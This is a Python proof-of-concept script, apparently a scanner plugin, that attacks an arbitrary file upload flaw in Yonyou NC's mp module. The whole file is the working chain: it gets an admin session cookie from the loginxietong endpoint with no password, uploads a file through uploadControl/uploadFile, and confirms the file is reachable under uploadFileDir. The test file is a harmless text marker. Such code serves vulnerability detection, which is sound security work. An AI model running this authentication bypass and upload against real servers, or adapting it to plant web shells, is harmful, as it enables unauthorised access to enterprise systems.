'''
Function:
    yonyouNC mp 文件上传
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import random
import string
from urllib.parse import urlparse, urlunparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def get_cookie(self, netloc, scheme):
        url = "{}://{}/mp/loginxietong?username=admin".format(scheme, netloc)
        try:
            result = requests.get(url, proxies=self.proxies, headers=self.headers, allow_redirects=False, verify=False, timeout=3)
            cookie = result.headers['Set-Cookie'].split(";")[0] + ';'
            return cookie
        except:
            return False

    def vuln(self, netloc, scheme):
        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        payload = "test" + char
        url = "{}://{}/mp/uploadControl/uploadFile".format(scheme, netloc)
        try:
            cookie = self.get_cookie(netloc, scheme)
            headers = {
                'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
                'Cookie': cookie
            }
            data = {
                "file": ("{}.txt".format(payload), "{}".format(payload).encode(), "application/octet-stream"),
                "submit": (None, "上传", None),
            }
            result = requests.post(url=url, files=data, proxies=self.proxies, headers=headers, verify=False, timeout=3)
            end_result = requests.get("{}://{}/mp/uploadFileDir/{}.txt".format(scheme, netloc, payload), proxies=self.proxies, headers=self.headers, verify=False, timeout=3)
            if payload in end_result.text and end_result.status_code == 200:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                bodys = result.request.body.decode().split("\r\n")
                for body in bodys:
                    self.result_text += "\n                 {}".format(body)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False

